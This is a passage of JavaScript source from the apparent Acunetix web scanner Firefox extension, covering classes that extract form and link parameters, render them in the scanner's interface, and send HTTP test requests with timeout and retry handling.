			var objReqParam							= new classRequestParameter();
			objReqParam.intID						= acunetixwebscanner.intParameterIndex ++;
			objReqParam.strId						= this.strId;
			objReqParam.strName						= objQuery.GetParameterName(i);
			objReqParam.strType						= "atext";
			objReqParam.strRequestType				= "GET";
			objReqParam.boolMultipleSelectionControll = false;
			objReqParam.boolSendParameter 			= true;
			
			objReqParam.arrayUserSelectedValues.push(objQuery.GetParameterValue(i));
			objReqParam.arraySelectableValues.push(objQuery.GetParameterValue(i));
			
			this.addNewRequestParrameter(objReqParam);
		}
	}
	
	function checkIfObeyLocationRule(objReferenceAnchor, objAnchor)
	{
		if ( objReferenceAnchor.compareWith(objAnchor) >= acunetixwebscanner.objMozPrefs.getIntPref("intRequestExtractorRuleLocation"))
			return(true);
		else
			return(false);	
	}

	this.feedContainerFromElementWithReference = function(objHTMLElement, strReferenceName, strElementName)
	{	
		logToFile("classRequestContainer/feedContainerFromElementWithReference");	
		this.strRequestOrigin	= "Reference of: " + strElementName;	
		this.strRequestMethod	= "GET";
		this.strId				= getElementIDOrGenerateOne(objHTMLElement);

		this.objAction.ParseUrl(this.strDocumentLocation);
		
		logToFile("classRequestContainer/feedContainerFromElementWithReference " + this.objAction);	

		this.objAction.colerateWithStringURL(objHTMLElement.hasAttribute(strReferenceName) ? objHTMLElement.getAttribute(strReferenceName) : "");
		
		logToFile("classRequestContainer/feedContainerFromElementWithReference " + this.objAction);	

		if(!checkIfObeyLocationRule(new classUrlParser(this.strOriginalLocation), this.objAction ))
			return(false);

		this.getParamsFromURLParser(this.objAction);
		
		if(this.arrayParameters.length > 0)
		{
			if(acunetixwebscanner.objMozPrefs.getBoolPref("boolRequestExtractorRuleExtractCookie"))
				this.extractCookieParams();
			this.insertHeadeVariables();
		}
		return(true);
	}
		
	this.feedContainerFromForm = function(objForm)
	{
		logToFile("classRequestContainer/feedContainerFromForm " + this.objAction);
		try {if (objForm.nodeName.toLowerCase() != "form") return(false);}catch (e){return(false)}
		
		this.strId				= getElementIDOrGenerateOne(objForm);
        this.strRequestOrigin	= "Form";
		this.strRequestMethod	= "GET";
		
        if (objForm.hasAttribute("method")) this.strRequestMethod = objForm.getAttribute("method").toUpperCase();

		this.objAction.ParseUrl(this.strDocumentLocation);
		this.objAction.colerateWithStringURL(objForm.hasAttribute("action")?objForm.getAttribute("action"):"");
		
		if(!checkIfObeyLocationRule(new classUrlParser(this.strOriginalLocation),this.objAction))
			return(false);
		
		this.getParamsFromURLParser(this.objAction);

		this.strName		= objForm.hasAttribute("name") ? objForm.getAttribute("name") : "";
		var inputElements	= objForm.getElementsByTagName("input");

		for(var i = 0; i < inputElements.length; i++)
		{
			if(!inputElements[i].hasAttribute("name")) continue;
			
			var objReqParam				= new classRequestParameter();
			objReqParam.strId			= getElementIDOrGenerateOne(inputElements[i]);
			objReqParam.intID			= acunetixwebscanner.intParameterIndex ++;
			objReqParam.strRequestType	= this.strRequestMethod;
			objReqParam.strName			= inputElements[i].getAttribute("name");
			objReqParam.strType			= (inputElements[i].hasAttribute("type")) ? inputElements[i].getAttribute("type").toLowerCase() : "text";
			
			switch(objReqParam.strType)
			{
				case "text": case "password": case "hidden": case "readonly": case "submit":
					objReqParam.boolMultipleSelectionControll = false;
					objReqParam.boolSendParameter = true;
					break;
				case "checkbox":
					objReqParam.boolMultipleSelectionControll = false;
                    objReqParam.boolSendParameter = inputElements[i].checked;
					break;
				case "radio":
					//radio items with the same name will create just one RequestParameter item
					//check if there is a radio parameter registered already with the same name
					var found = false;
					for(var j = 0; j < this.arrayParameters.length; j++)
					{
						if((this.arrayParameters[j].strType == objReqParam.strType)&&(this.arrayParameters[j].strName == objReqParam.strName ))
						{
							objReqParam = this.arrayParameters[j];
							found = true;
							break;
						}
					}
					if(inputElements[i].checked)
					{
						objReqParam.arrayUserSelectedValues = new Array();
						objReqParam.arrayUserSelectedValues.push(inputElements[i].value);
					}
					objReqParam.boolMultipleSelectionControll = false;
					objReqParam.arraySelectableValues.push(inputElements[i].value);
					objReqParam.boolSendParameter = true;
					if (found) continue;
					break;
				default:
					continue;
			}
			this.addNewRequestParrameter(objReqParam);
		}	
		
		var inputElements = objForm.getElementsByTagName("textarea");
		for(var i=0; i<inputElements.length; i++)
		{
			if(!inputElements[i].hasAttribute("name")) continue;
			var objReqParam				= new classRequestParameter();
			objReqParam.strId			= getElementIDOrGenerateOne(inputElements[i]);
			objReqParam.intID			= acunetixwebscanner.intParameterIndex ++;
			objReqParam.strRequestType	= this.strRequestMethod;	
			objReqParam.strName			= inputElements[i].getAttribute("name");	
			objReqParam.strType			= "textarea";
			objReqParam.boolMultipleSelectionControll = false;
			objReqParam.boolSendParameter = true;
			this.addNewRequestParrameter(objReqParam);
		}
		
		var inputElements = objForm.getElementsByTagName("button");
		for(var i=0; i<inputElements.length; i++)
		{
			if(!inputElements[i].hasAttribute("name")) continue;
			if(!inputElements[i].hasAttribute("type")) continue;
			if(inputElements[i].getAttribute("type")!= "submit") continue;
			
			var objReqParam				= new classRequestParameter();
			objReqParam.strId			= getElementIDOrGenerateOne(inputElements[i]);
			objReqParam.intID			= acunetixwebscanner.intParameterIndex ++;
			objReqParam.strRequestType	= this.strRequestMethod;
			objReqParam.strName			= inputElements[i].getAttribute("name");
			objReqParam.strType			= "button_submit";
			objReqParam.boolMultipleSelectionControll = false;
			objReqParam.boolSendParameter = true;
			this.addNewRequestParrameter(objReqParam);
		}
		
		var inputElements = objForm.getElementsByTagName("select");
		for(var i=0; i<inputElements.length; i++)
		{
			if(!inputElements[i].hasAttribute("name")) continue;
			var objReqParam				= new classRequestParameter();
			objReqParam.strId			= getElementIDOrGenerateOne(inputElements[i]);
			objReqParam.intID			= acunetixwebscanner.intParameterIndex ++;
			objReqParam.strRequestType	= this.strRequestMethod;	
			objReqParam.strName			= inputElements[i].getAttribute("name");
			objReqParam.strType			= "select";
			objReqParam.boolSendParameter = true;
			objReqParam.boolMultipleSelectionControll = inputElements[i].hasAttribute("MULTIPLE");
			this.addNewRequestParrameter(objReqParam);
		}
		
		if(this.arrayParameters.length > 0)
		{
			if(acunetixwebscanner.objMozPrefs.getBoolPref("boolRequestExtractorRuleExtractCookie"))
				this.extractCookieParams();
			this.insertHeadeVariables();
		}
		this.refreshParametersData();
		return(true);
	}

	this.toString = function()
	{
		var result = new String();
		result = result + "Request id: " + this.strId + " name: " + this.strName + " method: " + this.strRequestMethod + " action: "+this.objAction.getURL() + "\r\n";
		for(i = 0 ; i < this.arrayParameters.length ; i++)
			result = result + this.arrayParameters[i];
		result =result + "\r\n";
		return(result)
	}

	this.render =function()
	{
		var result = new String();
		result = result + '<groupbox id="request_group_' + this.strId + '" >';
		result = result + '<label id="scanner_status_' + this.strId + '" value=""/>'
		result = result + 	'<caption label="' + this.strRequestOrigin + " id: "+ this.strId;
		if (this.strName != '') result = result + ", name: " + this.strName;
		result = result +			", method: " + this.strRequestMethod;
		result = result +			", action: " + this.objAction.getURL();
		result = result +			'"/>';
		result = result +	'<vbox >';
		result = result +		'<toolbar flex="1" >';
		result = result +			'<toolbarbutton	class = "acunetixToolbarButon-test" ';
		result = result +					'label = "' + acunetixwebscanner.strings.getString("requesPannel.request.buttonTest_request.label") + '" ';
		result = result +					'id="request_test_' + this.strId + '" oncommand="acunetixwebscanner.testGivenRequest(\''+this.strId+'\');" />';
		
		result = result +			'<toolbarbutton class = "acunetixToolbarButon-reload" ';
		result = result +				'label = "' + acunetixwebscanner.strings.getString("requesPannel.request.buttonReload_request.label") + '" ';
		result = result +				'id="request_reload_' + this.strId + '" oncommand="acunetixwebscanner.reloadDataForGivenRequest(\''+this.strId+'\');" />';
		
		result = result +			'<toolbarbutton class = "acunetixToolbarButon-add" ';
		result = result +				'label="' + acunetixwebscanner.strings.getString("requesPannel.request.buttonToggleOn.label") + '" ';
		result = result +				'id="request_toggleon_' + this.strId + '" oncommand="acunetixwebscanner.togleGivenRequestON(\''+this.strId+'\');"/>';
		result = result +			'<toolbarbutton class = "acunetixToolbarButon-remove" ';
		result = result +			'label="' + acunetixwebscanner.strings.getString("requesPannel.request.buttonToggleOff.label") + '" ';
		result = result +			'id="request_toggleoff_' + this.strId + '" oncommand="acunetixwebscanner.togleGivenRequestOFF(\''+this.strId+'\');"/>';
		result = result +		'</toolbar>';
		
		result = result +	'<hbox>';
		result = result +		'<grid flex="1">';
		result = result +			'<columns>';
		result = result +				'<column flex="2"/>';
		result = result +				'<column flex="1"/>';
		result = result +				'<column flex="1"/>';
		result = result +				'<column flex="1"/>';
		result = result +				'<column flex="1"/>';
		result = result +				'<column flex="1"/>';
		result = result +				'<column flex="1"/>';
		result = result +			'</columns>';
		result = result +			'<rows>';
		result = result +				'<row>';
		result = result +					'<label value="Param.Name"/>';
		result = result +					'<label value="Param.Type"/>';
		result = result +					'<label value="Test method"/>';
		result = result +					'<spacer/>';
		result = result +					'<spacer/>';
		result = result +					'<spacer/>';
		result = result +					'<spacer/>';
		result = result +				'</row>';

		for(var i = 0; i < this.arrayParameters.length ; i++)
			result = result + this.arrayParameters[i].render();

		result = result +			'</rows>';
		result = result +		'</grid>';
		result = result +	'</hbox>';
		result = result +	'</vbox>';
		result = result + '</groupbox>';

		return(result);
	}
}
VM894:14 /*
Author:		Attila Gerendi
Purpose:	The classRequestParameter
*/

function classRequestParameter(objPageDocument) 
{
	this.strName						= new String();
	this.strType						= new String();
	this.intID							= 0;
	this.strId							= new String();
	this.strRequestType 				= new String();
	this.intEscapeMethod				= 1;
	this.boolSendParameter				= true;
	this.boolMultipleSelectionControll	= false;
	this.boolApplyTestPaterns			= false;
	this.boolSelectionChangeable		= false;
	this.boolAllowMultipleSelection		= false;
	this.arrayUserSelectedValues		= new Array();
	this.arraySelectableValues 			= new Array();
		
	this.toString = function()
	{
		result = ""
		result = result + "Parameter: " + this.strType + " " + this.strName + " (" + this.strId +")\r\n";
		if(this.boolSendParameter)
			result = result + " boolSendParameter"
		if(this.boolMultipleSelectionControll)
			result = result + " boolMultipleSelectionControll"
		if(this.boolApplyTestPaterns)
			result = result + " boolApplyTestPaterns"
		if(this.boolSelectionChangeable)
			result = result + " boolSelectionChangeable"
		if(this.boolAllowMultipleSelection)
			result = result + " boolAllowMultipleSelection"
		result = result + "\r\n";
		result = result + "\t arrayUserSelectedValues = " + this.arrayUserSelectedValues + "\r\n";
		result = result + "\t arraySelectableValues = " + this.arraySelectableValues+ "\r\n";
		return(result);
	}
	
	this.compactParameters = function(objParameter)
	{
		var compactingOcured = false;
		if(this.isEquivalentWith(objParameter))
		{
			for(var i = 0; i < objParameter.arraySelectableValues.length; i++)
				if(this.arraySelectableValues.indexOf(objParameter.arraySelectableValues[i]) < 0)
				{
					this.arraySelectableValues.push(objParameter.arraySelectableValues[i]);
					compactingOcured = true;
				}
		}
		return (compactingOcured);
	}

	this.compareUserSelectedDataWith = function(objParameter)
	{
		boolAllThisIncludedInObjParameter = true;
		for(var i = 0; i < this.arrayUserSelectedValues.length; i++)
		{
			if(objParameter.arrayUserSelectedValues.indexOf(this.arrayUserSelectedValues[i]) < 0)
			{
				boolAllThisIncludedInObjParameter = false;
				break;
			}
		}
		boolAllobjParameterIncludedInThis = true;
		for(var i = 0; i < objParameter.arrayUserSelectedValues.length; i++)
		{
			if(this.arrayUserSelectedValues.indexOf(this.arrayUserSelectedValues[i]) < 0)
			{
				boolAllobjParameterIncludedInThis = false;
				break;
			}
		}
		if(boolAllThisIncludedInObjParameter && boolAllobjParameterIncludedInThis) return ("equivalent");
		if(boolAllThisIncludedInObjParameter && (!boolAllobjParameterIncludedInThis) ) return ("included");
		if(boolAllobjParameterIncludedInThis && (!boolAllThisIncludedInObjParameter) ) return ("contain");
		return("different");
	}
	
	this.compareSelectableDataWith = function(objParameter)
	{
		boolAllThisIncludedInObjParameter = true;
		for(var i = 0; i < this.arraySelectableValues.length; i++)
		{
			if(objParameter.arraySelectableValues.indexOf(this.arraySelectableValues[i]) < 0)
			{
				boolAllThisIncludedInObjParameter = false;
				break;
			}
		}
		boolAllobjParameterIncludedInThis = true;
		for(var i = 0; i < objParameter.arraySelectableValues.length; i++)
		{
			if(this.arraySelectableValues.indexOf(this.arraySelectableValues[i]) < 0)
			{
				boolAllobjParameterIncludedInThis = false;
				break;
			}
		}
		if(boolAllThisIncludedInObjParameter && boolAllobjParameterIncludedInThis) return ("equivalent");
		if(boolAllThisIncludedInObjParameter && (!boolAllobjParameterIncludedInThis) ) return ("included");
		if(boolAllobjParameterIncludedInThis && (!boolAllThisIncludedInObjParameter) ) return ("contain");
		return("different");
	}
	
	// equivalency test betwen this and a seccond RequestParamater
	this.isEquivalentWith = function(objRequestParameter)
	{
		if(this.strName.toLowerCase() != objRequestParameter.strName.toLowerCase())
			return (false);
		if(this.strRequestType.toLowerCase() != objRequestParameter.strRequestType.toLowerCase())
			return (false);
		return(true);
	}
	
	// render the class to be shown in firefox
	this.render = function()
	{
		var strResult = new String();
		strResult = strResult +'<row>';
		strResult = strResult +		'<vbox pack="start"><textbox readonly="true" size = "10" value="'
										+ this.strName
										+ '" onmouseover="acunetixwebscanner.objHighlighter.highlightItem(\'' + this.strId + '\',true)" onmouseout="acunetixwebscanner.objHighlighter.highlightItem(\'' + this.strId + '\',false)"/></vbox>';
		strResult = strResult +		'<vbox pack="start"><textbox readonly="true" value="'
										+ this.strRequestType + ':' + this.strType + '" size = "10"/></vbox>';
		strResult = strResult +		'<vbox pack="start">';
		strResult = strResult +			'<checkbox ';
		strResult = strResult +				'id = "applyTestPatterns_' + this.strId +'" label="Test" checked="' + this.boolApplyTestPaterns + '" oncommand = "acunetixwebscanner.cmdChangeRequestParameter(\'' + this.intID + '\',\'boolApplyTestPaterns\',this.checked)" />';
		strResult = strResult +		'</vbox>';
		strResult = strResult +		'<vbox pack="start">';
		strResult = strResult +			'<checkbox ';
		strResult = strResult +				'label="'+acunetixwebscanner.strings.getString("requesPannel.parameter.cbChangeSelections")+'" ';
		strResult = strResult +				'checked="' + this.boolSelectionChangeable + '" disabled="' + (this.arraySelectableValues.length <= 1) + '" oncommand = "acunetixwebscanner.cmdChangeRequestParameter(\'' + this.intID + '\',\'boolSelectionChangeable\',this.checked)" />';
		strResult = strResult +		'</vbox>';
		strResult = strResult +		'<vbox pack="start">';
		strResult = strResult +			'<checkbox ';
		strResult = strResult +				'label="'+acunetixwebscanner.strings.getString("requesPannel.parameter.cbMultipleSelections")+'" ';
		strResult = strResult +				'disabled="' + !this.boolMultipleSelectionControll + '" checked="' + this.boolAllowMultipleSelection + '" oncommand = "acunetixwebscanner.cmdChangeRequestParameter(\'' + this.intID + '\',\'boolAllowMultipleSelection\',this.checked)"/>';
		strResult = strResult +		'</vbox>';
		strResult = strResult +		'<vbox pack="start">';
		strResult = strResult +			'<checkbox ';
		strResult = strResult +				'label="'+acunetixwebscanner.strings.getString("requesPannel.parameter.cbSend")+'" ';
		strResult = strResult +				'checked="' + this.boolSendParameter + '" oncommand = "acunetixwebscanner.cmdChangeRequestParameter(\'' + this.intID + '\',\'boolSendParameter\',this.checked)"/>'
		strResult = strResult +		'</vbox>';
		strResult = strResult +	'<spacer flex="10000" />';
		strResult = strResult +'</row>';
		return(strResult);
	}
}
VM894:15 /*
Author:		Attila Gerendi
Purpose:	The ClassTestRequest, the base of all parameter mannipulation test
*/

function ClassTestRequest()
{
	this.strRequestURL				= "";
	this.strRequestMethod			= ""
	this.strUsername				= "";
	this.strPassword				= "";
	this.boolDeleteOriginalCookie	= false;
	this.boolDeleteOriginalHeaders	= false;
	this.intRedirectionLimit		= 20;
	
	this.arrayAcceptedContentTypes	= new Array();

	this.objGetParams				= new classParameterList("","&");
	this.objPostParams				= new classParameterList("","&");
	this.objCookieParams			= new classParameterList("",";");
	this.objHeaders					= new classParameterList("","\r\n");
	
	this.boolAsincronRequestAborted = 0;
	this.boolHeadersRecorded		= false;
	this.objCallerClass 			= null;
	this.objHTTPReq 				= null;
	
	this.intRetryNumber				= 0;
	this.boolEnableRetry			= true;
	
	this.toString					= toString;
	this.createCopy					= createCopy;
	this.doAsincronRequest			= doAsincronRequest;
	
	function abortCurrentRequest()
	{
		this.boolAsincronRequestAborted = 1;
		acunetixwebscanner.generalTimer.cancel();
		this.objHTTPReq.abort();
	}
	
	/*
	intErrorCode == -1 aborted by error
	intErrorCode == 1 aborted by user
	intErrorCode == 2 aborted by timeout
	intErrorCode == 3 aborted by error (nu prea cred ca iese pe aici vreodata)
	intErrorCode == 4 aborted because length
	intErrorCode == 5 aborted because content type
	*/	
	
	function doAsincronRequest(objCallerClass)
	{
		this.boolAsincronRequestAborted = 0;
		this.boolHeadersRecorded		= false;
		
		if(objCallerClass != null)
		{
			this.objCallerClass = objCallerClass;
		}
		
		var strRequestURL 	= this.strRequestURL;
		this.objHTTPReq		= new XMLHttpRequest();
		
		
		function onreadystatechange()
		{
						
			//this.parent.objHTTPReq.abort(); will retrigger this function, next time we will just exit
			if(this.parent.boolAsincronRequestAborted == 1)
				return;
			
			if(this.parent.objCallerClass.objCallerClass.boolTesterMarkedToDie)
			//if(acunetixwebscanner.objScanningProcessStatus.boolAbortScan)
			{
				logToFile("/doAsincronRequest/onreadystatechange => userAbortRequest detected (boolAbortScan = true)");
				this.parent.boolAsincronRequestAborted = 1;
				acunetixwebscanner.generalTimer.cancel();
				this.parent.objHTTPReq.abort();
				return;
			}
			
			if (this.parent.boolAsincronRequestAborted > 0)
			{
				logToFile("/doAsincronRequest/onreadystatechange => aborted: " + this.parent.boolAsincronRequestAborted);
				switch(this.parent.boolAsincronRequestAborted)
				{
					case 1: // aborted by user
						this.parent.objCallerClass.objTaskResult.intErrorCode			= this.parent.boolAsincronRequestAborted;
						this.parent.objCallerClass.objTaskResult.strErrorText			= "Aborted";
						break;
					case 3: // this case (error generated in the request try catch) is already handled
						return;
					case 2: // aborted by timeout
						if((this.parent.boolEnableRetry) && (this.parent.intRetryNumber < acunetixwebscanner.objMozPrefs.getIntPref("intMaximumRetry")))
						{
							this.parent.intRetryNumber ++;
							logToFile("/doAsincronRequest/onreadystatechange => Retriing by timeout: " + this.parent.intRetryNumber);
							this.parent.doAsincronRequest();
							return;	
						}
						this.parent.objCallerClass.objTaskResult.intErrorCode			= -1;
						this.parent.objCallerClass.objTaskResult.strErrorText			= "Timeout (" + acunetixwebscanner.objMozPrefs.getIntPref("intRequestTimeOut") + ")";
						acunetixwebscanner.objScanningProcessStatus.oneMoreErrorFound();
						break;
					default: //aborted by filters
						break;
				}
				if (this.parent.boolAsincronRequestAborted == 3) // this case (error generated in request try catch) is already handled
					return;
				
				//EXITPOINT
				acunetixwebscanner.objScanningProcessStatus.oneMoreRequestHandled() ;
				acunetixwebscanner.generalTimer.initWithCallback(this.parent.objCallerClass.fncTaskCallBack, acunetixwebscanner.objMozPrefs.getIntPref("intStatusMachineRetriggerTime") , Components.interfaces.nsITimer.TYPE_ONE_SHOT);
				return;				
			}
			else
			{
				if(this.parent.objHTTPReq.readyState == 1)
				{
					//logToFile("=> doAsincronRequest => onreadystatechange => readyState = 1");
				}
				else
				if(this.parent.objHTTPReq.readyState == 2)
				{
					//here we have the request header formed 
					logToFile("=> doAsincronRequest => onreadystatechange => readyState = 2");
					var strRequestHeader = this.parent.strRequestMethod + ' ';
					strRequestHeader = strRequestHeader + this.parent.strRequestURL;
					if( this.parent.objGetParams.toString() != "")
						strRequestHeader = strRequestHeader + "?" + this.parent.objGetParams.toString();
					strRequestHeader = strRequestHeader + ' HTTP/1.1\r\n' + this.parent.objHTTPReq.strRequestHeaders + '\r\n';
					if(this.parent.strRequestMethod == 'POST')
					{
						strRequestHeader = strRequestHeader + this.parent.objPostParams.toString();
					}
					this.parent.objCallerClass.objTaskResult.strRequestHeader	= strRequestHeader;
				}
				else
				if(this.parent.objHTTPReq.readyState == 3)
				{
					// here we have response, and the response header formed
					logToFile("=> doAsincronRequest => onreadystatechange => readyState = 3");		
					var strResponseHeader = 'HTTP/1.1 ' + this.parent.objHTTPReq.status + ' ' + this.parent.objHTTPReq.statusText + '\r\n' + this.parent.objHTTPReq.getAllResponseHeaders();
					this.parent.objCallerClass.objTaskResult.strResponseHeader	= strResponseHeader;
					this.parent.boolHeadersRecorded = true;
					
					var length = this.parent.objHTTPReq.getResponseHeader("Content-Length");
					if( length > acunetixwebscanner.objMozPrefs.getIntPref("intMaximumResponseAlowed"))
					{
						logToFile("/doAsincronRequest/onreadystatechange => Aborting: response too big");
						this.parent.objCallerClass.objTaskResult.strResponseText = "[RESPONSE DELETED (Too Big)]"
						this.parent.boolAsincronRequestAborted = 4;
						acunetixwebscanner.generalTimer.cancel();
						this.parent.objHTTPReq.abort();
					}
					
					var contentType = this.parent.objHTTPReq.getResponseHeader("Content-Type");
					var boolFound = false;
					
					if ((this.parent.arrayAcceptedContentTypes == null) || (this.parent.arrayAcceptedContentTypes.length == 0))
						boolFound = true;
					else
					{
						for(var i = 0; i < this.parent.arrayAcceptedContentTypes.length; i++)
						{
							if(contentType.search(this.parent.arrayAcceptedContentTypes[i]) != -1)
							{
								boolFound = true;
								break;
							}
						}
					}
					if(!boolFound)
					{
						logToFile("/doAsincronRequest/onreadystatechange => Aborting: content type not alowed (" + contentType + ")");
						this.parent.objCallerClass.objTaskResult.strResponseText = "[RESPONSE DELETED (Content-Type Not Alowed)]"
						this.parent.boolAsincronRequestAborted = 5;
						acunetixwebscanner.generalTimer.cancel();
						this.parent.objHTTPReq.abort();
					}
				}
				else
				if(this.parent.objHTTPReq.readyState == 4)
				{
					acunetixwebscanner.generalTimer.cancel();
					
					logToFile("doAsincronRequest/onreadystatechange => readyState = OK (4)");
								
					try //we need to handle this way because firefox weird behavior to in case of error first call onreadyState with readyState = 4 after that onerror....
					{
						if (!this.parent.boolHeadersRecorded)
						{
							var strResponseHeader = 'HTTP/1.1 ' + this.parent.objHTTPReq.status + ' ' + this.parent.objHTTPReq.statusText + '\r\n' + this.parent.objHTTPReq.getAllResponseHeaders();
							this.parent.objCallerClass.objTaskResult.strResponseHeader	= strResponseHeader;
						}
						
						this.parent.objCallerClass.objTaskResult.intErrorCode		= 0;
						this.parent.objCallerClass.objTaskResult.strErrorText		= "";
						this.parent.objCallerClass.objTaskResult.intReponseStatus	= this.parent.objHTTPReq.status;
						this.parent.objCallerClass.objTaskResult.strResponseText	= this.parent.objHTTPReq.responseText;						
					}
					catch(e)
					{
						if((this.parent.boolEnableRetry) && (this.parent.intRetryNumber < acunetixwebscanner.objMozPrefs.getIntPref("intMaximumRetry")))
						{
							this.parent.intRetryNumber ++;
							logToFile("/doAsincronRequest/onreadystatechange => Retrying by timeout: " + this.parent.intRetryNumber);
							this.parent.doAsincronRequest();
							return;	
						}
						this.parent.objCallerClass.objTaskResult.intErrorCode		= -1;
						this.parent.objCallerClass.objTaskResult.strErrorText		= e;
						
						acunetixwebscanner.objScanningProcessStatus.oneMoreErrorFound();
						
						logToFile("=> doAsincronRequest => onreadystatechange => connection error or " + e);
					}
										
					//EXITPOINT
					acunetixwebscanner.objScanningProcessStatus.oneMoreRequestHandled() ;
					acunetixwebscanner.generalTimer.initWithCallback(this.parent.objCallerClass.fncTaskCallBack, acunetixwebscanner.objMozPrefs.getIntPref("intStatusMachineRetriggerTime") , Components.interfaces.nsITimer.TYPE_ONE_SHOT);
					return;
				}
			}
		}
		
		var timeoutCallBack =
		{
			notify: function(timer)
			{
				logToFile("/doAsincronRequest/timeoutCallBack");
				this.parent.boolAsincronRequestAborted = 2;
				acunetixwebscanner.generalTimer.cancel();
				this.parent.objHTTPReq.abort();
			}
		}

		if( this.objGetParams.toString() != "")
			strRequestURL = strRequestURL + "?" + this.objGetParams.toString();
			
		this.objCallerClass.objTaskResult.intReponseStatus		= "";
		this.objCallerClass.objTaskResult.strResponseText		= "";
		this.objCallerClass.objTaskResult.strResponseHeader		= "";
		this.objCallerClass.objTaskResult.strRequestHeader		= "";
		this.objCallerClass.objTaskResult.strRequestURL			= this.strRequestURL;
			
		try
		{	
			this.objHTTPReq.open(this.strRequestMethod, strRequestURL, true, this.strUsername, this.strPassword);            
			new classXMLHTTPRequestHook(this.objHTTPReq, this.objCookieParams, this.objHeaders, this.intRedirectionLimit, this.boolDeleteOriginalCookie, this.boolDeleteOriginalHeaders);
				
			onreadystatechange.parent 	= this;
			// for some reason in the firefox 3.0 the parent is losed if we use like above, so we also ad this to the xmlHTTPRequest object
			this.objHTTPReq.parent 		= this;
			
			timeoutCallBack.parent 		= this;
			
			this.objHTTPReq.onreadystatechange = onreadystatechange;
			//this.objHTTPReq.onerror = onError;
			
			acunetixwebscanner.generalTimer.initWithCallback(timeoutCallBack, acunetixwebscanner.objMozPrefs.getIntPref("intRequestTimeOut") , Components.interfaces.nsITimer.TYPE_ONE_SHOT);
			if (this.strRequestMethod.toUpperCase() == "POST")
			{
				this.objHTTPReq.setRequestHeader('Content-Type','application/x-www-form-urlencoded');     
				this.objHTTPReq.send(this.objPostParams.toString());
			}
			else
				this.objHTTPReq.send(null);
		}
		catch(e)
		{
			logToFile("/doAsincronRequest/Error int the XMLHTTPRequest core (Aborting this one)");
			this.boolAsincronRequestAborted = 3;
			acunetixwebscanner.generalTimer.cancel();
			this.objCallerClass.objTaskResult.strErrorText = e;
			this.objCallerClass.objTaskResult.intErrorCode = -1;
			//this is a request mechanizm error so we are not retiing this one!!
			
			//EXITPOINT
			acunetixwebscanner.objScanningProcessStatus.oneMoreErrorFound();
			acunetixwebscanner.objScanningProcessStatus.oneMoreRequestHandled() ;
			acunetixwebscanner.generalTimer.initWithCallback(this.objCallerClass.fncTaskCallBack, acunetixwebscanner.objMozPrefs.getIntPref("intStatusMachineRetriggerTime") , Components.interfaces.nsITimer.TYPE_ONE_SHOT);
		}
		
	}
	
	function toString()
	{
		result = "";;
		result = result + "Request:\thttp://";
		if((this.strUsername != "")&&(this.strPassword != ""))
			result = result + this.strUsername + "@" + this.strPassword;
		result = result + this.strRequestURL + "\r\n";
		result = result + "GetParams:\t" + this.objGetParams + "\r\n";
		result = result + "PostParams:\t" + this.objPostParams + "\r\n";
		result = result + "Cookie:\t" + this.objCookieParams + "\r\n";
		result = result + "Headers:\t" + this.objHeaders + "\r\n";
		return(result);
	}

	function createCopy()
	{
		obj								= new ClassTestRequest();
		obj.strRequestURL				= this.strRequestURL;
		obj.strRequestMethod			= this.strRequestMethod;
		obj.strPassword					= this.strPassword;
		obj.boolDeleteOriginalHeaders	= this.boolDeleteOriginalHeaders;
		obj.boolDeleteOriginalCookie	= this.boolDeleteOriginalCookie;
		obj.intRedirectionLimit			= this.intRedirectionLimit;
		obj.objGetParams				= this.objGetParams.createCopy();
		obj.objPostParams				= this.objPostParams.createCopy();
		obj.objCookieParams				= this.objCookieParams.createCopy();
		obj.objHeaders					= this.objHeaders.createCopy();
		return(obj)
	}
}

// this is the TESTER class parent, every test should derivate from this and export the same property-es and methods
function classGenericTester()
{
	
	this.objCallerClass		= null;
	this.fncTaskCallBack	= null;
	this.objTaskResult		= {};
	
	this.strXULMenuId			= ""
	this.strXULMenuText			= ""
	this.strXULMenuHint			= ""
	this.strXULMenuAccesskey	= ""
	this.strType				= "";
	this.strTestName			= "";
	this.severity				= "";
	this.strDescription			= "";
		
	this.myescape = function(strToEscapeString,intEscapeMethod)
	{
		switch(intEscapeMethod)
		{
			case 2:
				return(escape(strToEscapeString));
			case 1:
				var retval = "";
				for(var i = 0; i < strToEscapeString.length; i++)
				{
					if( ((strToEscapeString[i] >= '0') && (strToEscapeString[i] <= '9')) ||
						((strToEscapeString[i] >= 'A') && (strToEscapeString[i] <= 'Z')) ||
						((strToEscapeString[i] >= 'a') && (strToEscapeString[i] <= 'z'))
						)
						retval = retval + strToEscapeString[i];
					else
					{
						var c = strToEscapeString.charCodeAt(i).toString(16);
						if (c.length < 2) c = "0" + c;
						retval = retval + "%" + c;
					}
				}
				return(retval);
			//todo: Implement more escaping methods
			default:
				return(strToEscapeString);
		}
	}
	
	this.htmlParserTestForTag = function(strTagName, arrayTestStrings)
	{
		function comparation(strValue1, strComparation, strValue2)
		{
			if (strValue1 == null) strValue1 = "";
			if (strValue2 == null) strValue2 = "";
			switch(strComparation)
			{
				case ">": // value2 included in value1
					if(strValue1.toLowerCase().match(strValue2.toLowerCase()))
						return(true);
				case "<": // value1 included in value2
					if(strValue2.toLowerCase().match(strValue1.toLowerCase()))
						return(true);
				case "=": 
					if(strValue2.toLowerCase() == strValue1.toLowerCase())
						return(true);
					break;
				case "!": 
					if(strValue2.toLowerCase() != strValue1.toLowerCase())
						return(true);
					break;
				case "#":
					try
					{
						var regexp = regexp.compile(strValue2);
						if(regexp.exec(strValue1))
							return(true);
					}
					catch(e){}
					break;
			}
			return(false);
		}
		
		var objBrowserContainer = document.getElementById("acunetix_appcontent_browserContainer");
		if (objBrowserContainer)
		{
			var objTag  = objBrowserContainer.contentDocument.getElementsByTagName(strTagName);
			if(objTag)
			{
				for(var j = 0 ; j < objTag.length; j++)
				{
					var boolretval = true;
					for( var i = 0; i < arrayTestStrings.length; i++)
					{
						var regex = /(.*?)([=<>#])(.*)/;
						var matches = regex.exec(arrayTestStrings[i]);
						if((matches) && (matches.length = 4))
						{
							switch(matches[1])
							{
								case "textwithin":
									boolretval = boolretval && comparation(objTag[j].content, matches[2], matches[3]);
									break;
								default:
									boolretval = boolretval && comparation(objTag[j].getAttribute(matches[1]), matches[2], matches[3]);
							}
						}
					}
					if (boolretval) return(true);
				}
				return(false);
			}
			else
				return(false);
		}
		return(false);
	}
	
	this.testXssGenerationByID = function(testId)
    {
        var objBrowserContainer = document.getElementById("acunetix_appcontent_browserContainer");
        if (objBrowserContainer)
        {
            var xssElements  = objBrowserContainer.contentDocument.getElementsByTagName("XSSTestElement");
